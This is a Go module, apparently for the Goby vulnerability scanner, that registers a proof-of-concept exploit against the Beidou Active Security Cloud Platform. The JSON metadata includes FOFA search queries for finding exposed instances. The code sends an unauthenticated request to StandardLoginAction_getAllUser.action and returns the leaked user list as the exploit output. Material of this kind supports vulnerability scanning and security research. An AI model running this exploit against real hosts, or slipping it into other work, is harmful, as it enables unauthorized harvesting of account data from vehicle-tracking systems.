package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Beidou-Active-Sec-CP StandardLoginAction_getAllUser.action Unauthorized Access Vulnerability",
    "Description": "<p>The Beidou Active Safety Cloud Platform is a platform with innovative technology and open operation concepts based on vehicle location information services and vehicle video real-time transmission messages.</p><p>Beidou Active Security Cloud Platform StandardLoginAction_getAllUser.action information leakage vulnerability, attackers can use this vulnerability to obtain sensitive information of the system, etc.</p>",
    "Product": "Beidou-Active-Sec-CP",
    "Homepage": "http://www.g-sky.cn/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"wy-mod-lang switchMenuItem\" || body=\"/808gps/js/jquery.placeholder.js\"",
    "GobyQuery": "body=\"wy-mod-lang switchMenuItem\" || body=\"/808gps/js/jquery.placeholder.js\"",
    "Level": "2",
    "Impact": "<p>Beidou Active Security Cloud Platform StandardLoginAction_getAllUser.action information leakage vulnerability, attackers can use this vulnerability to obtain sensitive information of the system, etc.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "北斗主动安全云平台 StandardLoginAction_getAllUser.action 信息泄露漏洞",
            "Product": "北斗主动安全云平台",
            "Description": "<p>北斗主动安全云平台是基于车辆位置信息服务及车辆视频实时传输报务为基础的创技术及开放运营理念的平台。</p><p>北斗主动安全云平台 StandardLoginAction_getAllUser.action 信息泄露漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>北斗主动安全云平台 StandardLoginAction_getAllUser.action 信息泄露漏洞，攻击者可利用该漏洞获取系统的敏感信息等。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Beidou-Active-Sec-CP StandardLoginAction_getAllUser.action Unauthorized Access Vulnerability",
            "Product": "Beidou-Active-Sec-CP",
            "Description": "<p>The Beidou Active Safety Cloud Platform is a platform with innovative technology and open operation concepts based on vehicle location information services and vehicle video real-time transmission messages.</p><p>Beidou Active Security Cloud Platform StandardLoginAction_getAllUser.action information leakage vulnerability, attackers can use this vulnerability to obtain sensitive information of the system, etc.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>Beidou Active Security Cloud Platform StandardLoginAction_getAllUser.action information leakage vulnerability, attackers can use this vulnerability to obtain sensitive information of the system, etc.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-07",
    "PocId": "10896"
}`

	sendPayloadFlagIDlczA := func(hostInfo *httpclient.FixUrl) (string, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig(`/808gps/StandardLoginAction_getAllUser.action`)
		payloadRequestConfig.Header.Store(`Content-Type`, `application/x-www-form-urlencoded; charset=UTF-8`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.Utf8Html, `{"result":0,"infos":{`) {
			return resp.RawBody, nil
		} else if err != nil {
			return "", err
		} else {
			return "", errors.New("漏洞利用失败")
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadFlagIDlczA(hostinfo)
			return len(resp) > 1
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := sendPayloadFlagIDlczA(expResult.HostInfo)
			if len(resp) > 1 {
				expResult.Success = true
				expResult.Output = resp
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
